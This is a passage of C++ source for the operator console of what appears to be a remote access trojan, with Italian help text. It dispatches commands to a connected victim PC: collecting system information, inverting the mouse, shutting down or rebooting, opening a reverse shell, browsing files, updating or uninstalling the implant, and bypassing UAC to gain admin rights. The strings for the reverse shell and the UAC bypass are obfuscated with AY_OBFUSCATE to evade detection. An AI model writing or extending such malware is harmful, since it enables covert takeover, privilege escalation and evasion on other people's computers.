            StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
            StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
            StampaHelp("Shutdown\t", "- Spegne il PC.");
            StampaHelp("Reboot\t\t", "- Riavvia il PC.");
			StampaHelp((string)AY_OBFUSCATE("Reverseshell\t"), "- Lancia comandi sulla shell del PC remoto.");
            cout << char(192) << char(196) << "Revshell" << endl;
            StampaHelp("Filexplorer\t", "- Gestisci i file del PC remoto.");
            cout << char(192) << char(196) << "explorer" << endl;
			StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
            cout << endl;

            cli.SubTitle("Utility", 30, tc.Purple);
            StampaHelp("Exit\t", "- Torna al menu principale.");
            cout << char(192) << char(196) << "Close" << endl;
            StampaHelp("Clear\t", "- Pulisce la console da tutti i comandi precedenti.");
            cout << char(192) << char(196) << "Cls" << endl;
            StampaHelp("Help\t", "- Mostra la lista dei comandi.");
            cout << endl;
        }
        else if (cmd == "getinfo")
        {
            if (!GetInfo(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "invertmouse")
        {
            if (!InvertMouse(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "exit" || cmd == "close")
        {
            Controllo = false;
        }
        else if (cmd == "reconnect")
        {
            if (!Reconnect(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "clear" || cmd == "cls")
        {
            system("cls");
            StampaTitolo(1);
            cli.SubTitle("Sessione Comandi", 60, tc.Green);
        }
        else if (cmd == "killclient" || cmd == "kill")
        {
            if (!KillClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "shutdown")
        {
            if (!Shutdown(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "reboot")
        {
            if (!Reboot(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "updateclient" || cmd == "update")
        {
            switch (UpdateClient(Sock, ID))
            {
                case -1: Controllo = CheckConnection(Sock, ID); break;
                case 0: Controllo = false; break;
                case 1: break;
            }
        }
        else if (cmd == "uninstall")
        {
            if (!Uninstall(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "restartclient" || cmd == "restart")
        {
            if (!RestartClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == (string)AY_OBFUSCATE("reverseshell") || cmd == "revshell")
        {
            if (!ReverseShell(Sock))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "filexplorer" || cmd == "explorer")
        {
            if (Clients[ID].info.CompatibleVer < 1)
                StampaIncompatibile();
            else
            {
                switch (FileExplorer(Sock, ID))
                {
                    case 0:
                        system("cls");
                        StampaTitolo(1);
                        cli.SubTitle("Sessione Comandi", 60, tc.Green);
                        break;

                    case 1:
                        break;

                    case 2:
                        system("cls");
                        StampaTitolo(1);
                        cli.SubTitle("Sessione Comandi", 60, tc.Green);

                        Controllo = CheckConnection(Sock, ID);
                        break;
                }
            }
        }
		else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
		{
			if (Clients[ID].info.CompatibleVer < 2)
                StampaIncompatibile();
			else
			{
                if (Clients[ID].info.UAC == "Admin")
                    cout << "Il Client e' gia' amministratore." << endl;
                else
				    switch (BypassUAC(Sock, ID))
				    {
					    case 0:
						    Controllo = false;
						    break;
						
					    case 1:
						    break;
						
					    case 2:
						    Controllo = CheckConnection(Sock, ID);
						    break;
				    }
			}
		}
        else
        {
            cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
        }

        Clients[ID].InTask = false;
    }
}